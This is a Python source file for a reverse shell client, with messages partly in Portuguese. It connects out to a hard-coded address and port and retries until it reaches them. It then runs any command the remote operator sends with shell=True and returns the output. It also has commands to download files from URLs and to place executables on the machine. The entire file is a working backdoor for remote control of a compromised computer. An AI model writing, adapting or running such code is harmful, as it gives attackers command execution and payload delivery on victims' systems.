import socket
import time
import subprocess
import os
#import shutil
#import requests


ip = "192.168.1.7"
port = 7272

def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")

            return s
        except socket.error as e:
            if e.errno == 106:
                print("Socket already connected. Retrying...")
            else:
                print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "/exit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)

def cmd(s, data):
    try:
        if data.startswith("help"):
            help_text = """\n##########

Manual:
execute - before execution commands e.g., python file.py to receive a confirmation that you are executing a file;
cd - to change the directory you are in e.g., cd downloads;
ls or dir - to list folders and files;
ipconfig or ifconfig - to se your ip addresses.;

OBS: Você pode executar muitos comandos do próprio terminal normalmente

##########\n\n"""
            send_data(s, help_text)
        elif data.startswith("execute"):
            arquivo = data.split(" ", 1)[1]
            proc = subprocess.Popen(arquivo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = proc.communicate()
            send_data(s, out.decode())
            send_data(s, "[+] Executando arquivo...\n")
        elif data.startswith("baixar"):

            url = data.split(" ", 1)[1]

            file_name = os.path.basename(url)

            download_file(url, file_name)

            send_data(s, f"[+] Arquivo {file_name} baixado com sucesso.\n")

        elif data.startswith("install"):

            file_name = data.split(" ", 1)[1]

            target_directory = os.path.join(os.getcwd(), "downloads") 
            os.makedirs(target_directory, exist_ok=True)
            shutil.move(file_name, os.path.join(target_directory, file_name))
            send_data(s, "[+] Instalando arquivo...\n")

            if not is_compatible(file_name):
                send_data(s, f"[-] O arquivo {file_name} não é compatível com este sistema operacional.\n")

                os.remove(os.path.join(target_directory, file_name))
            else:
                send_data(s, f"[+] Arquivo {file_name} instalado com sucesso em {target_directory}.\n")

        elif data.startswith("cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Diretorio alterado com sucesso.\n")
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out, err = proc.communicate()
            send_data(s, out.decode())
    except Exception as e:
        print("Error in cmd:", e)

def is_compatible(file_name):

    allowed_extensions = {".exe", ".zip", ".tar", ".gz", ".tar.gz"}
    _, file_extension = os.path.splitext(file_name)
    return file_extension.lower() in allowed_extensions

def send_data(s, data):
    s.send(data.encode())

def download_file(url, target_filename):
    response = requests.get(url)
    with open(target_filename, 'wb') as file:
        file.write(response.content)

def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)

if __name__ == "__main__":
    main()
